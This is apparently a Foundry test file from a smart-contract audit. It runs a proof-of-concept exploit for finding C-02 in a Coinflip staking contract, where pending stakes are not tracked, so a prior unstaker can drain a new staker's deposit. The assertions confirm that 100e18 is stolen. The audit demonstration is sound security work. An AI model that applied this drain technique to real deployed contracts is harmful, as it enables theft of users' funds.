// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, Staking, Staker, MiniToken} from "./55503-c-02-pending-stake-not-accounted-for-in-liquidity-calculatio.sol";

// Coinflip C-02 (finding 55503): Staking.requestStake moves tokens into the pool
// immediately without tracking them as pending, so balanceOf()-based pro-rata math
// lets a prior unstaker drain a new staker's still-pending deposit.
// Bob supplies 100e18 -> Alice requests a 100e18 stake -> Bob unstakes 200e18.
contract Finding55503Test is Test {
    function test_exploit_pendingStakeDrainedByPriorUnstaker() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("bob deposited", e.bobDeposited());
        emit log_named_uint("bob received", e.bobReceived());
        emit log_named_uint("alice deposited", e.aliceDeposited());
        emit log_named_uint("alice redeemed", e.aliceRedeemed());
        emit log_named_uint("profit (stolen from alice)", e.profit());

        assertEq(e.bobReceived(), 200 ether, "bob drained inflated 200e18 balance");
        assertEq(e.aliceRedeemed(), 0, "alice lost her entire pending stake");
        assertEq(e.profit(), 100 ether, "stolen amount == alice's deposit");
    }
}
